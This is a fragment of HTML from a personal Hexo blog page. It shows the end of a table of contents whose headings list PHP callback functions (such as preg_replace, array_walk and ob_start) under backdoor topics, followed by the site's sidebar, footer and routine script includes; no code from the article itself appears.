+          5.array_udiff</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E5%8F%82%E6%95%B0%E5%9B%9E%E8%B0%83%E5%90%8E%E9%97%A8"><span class="toc-number">19.</span> <span class="toc-text">
+          三参数回调后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-preg-replace"><span class="toc-number">20.</span> <span class="toc-text">
+          1.preg_replace </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-array-walk"><span class="toc-number">21.</span> <span class="toc-text">
+          2.array_walk()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-array-walk-recursive"><span class="toc-number">22.</span> <span class="toc-text">
+          3.array_walk_recursive()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0"><span class="toc-number">23.</span> <span class="toc-text">
+          无回显回调函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-ob-start"><span class="toc-number">24.</span> <span class="toc-text">
+          1.ob_start </span></a></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/usually.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">hey</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">110</div><div class="sidebar-ov-state-item__name">Archives</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">0</div><div class="sidebar-ov-state-item__name">Categories</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">0</div><div class="sidebar-ov-state-item__name">Tags</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">You have read </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2024</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>hey</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v5.4.2</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.7.0</span></div><div class="busuanzi"><span class="busuanzi-sitepv"><span class="busuanzi-siteuv__icon"><i class="fas fa-eye"></i></span><span class="busuanzi-siteuv__info">Views</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_pv"></span></span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/gh/sukkaw/busuanzi@latest/bsz.pure.mini.js" async></script><script src="/js/utils.js?v=2.7.0"></script><script src="/js/stun-boot.js?v=2.7.0"></script><script src="/js/scroll.js?v=2.7.0"></script><script src="/js/header.js?v=2.7.0"></script><script src="/js/sidebar.js?v=2.7.0"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":180,"height":300},"mobile":{"show":true},"log":false});</script></body></html>
